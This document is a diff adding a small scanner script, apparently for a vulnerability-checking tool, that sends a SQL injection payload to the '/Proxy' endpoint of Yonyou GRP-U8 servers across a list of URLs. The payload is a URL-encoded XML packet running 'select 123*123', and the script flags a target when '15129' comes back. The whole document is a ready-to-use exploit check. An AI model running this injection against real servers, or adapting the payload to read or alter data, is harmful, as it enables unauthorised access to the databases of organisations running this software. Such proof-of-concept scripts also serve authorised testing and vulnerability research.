@@ -1,0 +1,24 @@
+#request urls = array
+#define payload = /Proxy
+#define bug = 15129
+#define info = yonyou-grp-u8-sqli
+#define post = cVer=9.8.0&dp=%3c?xml%20version%3d%221.0%22%20encoding%3d%22GB2312%22?%3e%3cR9PACKET%20version%3d%221%22%3e%3cDATAFORMAT%3eXML%3c%2fDATAFORMAT%3e%3cR9FUNCTION%3e%3cNAME%3eAS_DataRequest%3c%2fNAME%3e%3cPARAMS%3e%3cPARAM%3e%3cNAME%3eProviderName%3c%2fNAME%3e%3cDATA%20format%3d%22text%22%3eDataSetProviderData%3c%2fDATA%3e%3c%2fPARAM%3e%3cPARAM%3e%3cNAME%3eData%3c%2fNAME%3e%3cDATA%20format%3d%22text%22%3e%20select%20123%2a123%20%3c%2fDATA%3e%3c%2fPARAM%3e%3c%2fPARAMS%3e%3c%2fR9FUNCTION%3e%3c%2fR9PACKET%3e
+
+function main(args)
+{
+	printclolor("当前正在检测:".info,1);
+	i = 0;
+	num = GetArrayNum(urls);
+	while(i<num){
+		url = urls[i];
+		try{
+			res = HttpPost(url.payload,post,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0");
+			if(StrFindStr(res[0],bug,0)!= "-1")
+			{
+				printclolor("[+]".urls[i].info,3);
+			}
+		}catch{
+		}
+		i = ToInt(i+1);
+	}
+}
